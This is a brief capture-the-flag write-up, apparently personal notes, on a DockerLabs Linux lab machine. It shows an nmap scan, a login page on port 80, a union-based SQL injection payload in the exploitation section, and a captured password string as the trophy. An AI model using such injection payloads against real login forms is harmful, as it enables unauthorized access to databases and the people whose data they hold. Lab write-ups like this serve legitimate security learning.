---
os: Linux
tags:
  - "#sqli"
  - "#dockerlabs"
platform: DockerLabs
status:
---


## Improved skills

- `SQLI`


## Used tools

- nmap
---

## Information Gathering

Scanned all TCP ports:

```bash
❯ nmap -sCV -top-ports 100 --open 172.17.0.2
```

Enumerated open TCP ports:

```bash
80 - HTTP
```

---

## Enumeration

##### Port 80 - HTTP (Apache)

- Simple Login Page
![](../assets/Pasted image 20251027000419.png)

---

## Exploitation

##### SQL Injection

`> 1' union select 1,database()`

![](../assets/Pasted image 20251027000453.png)


---


## Trophy

![](../assets/Pasted image 20251027000550.png)

!!! todo "**Password.txt**"
    KJSDFG789FGSDF78

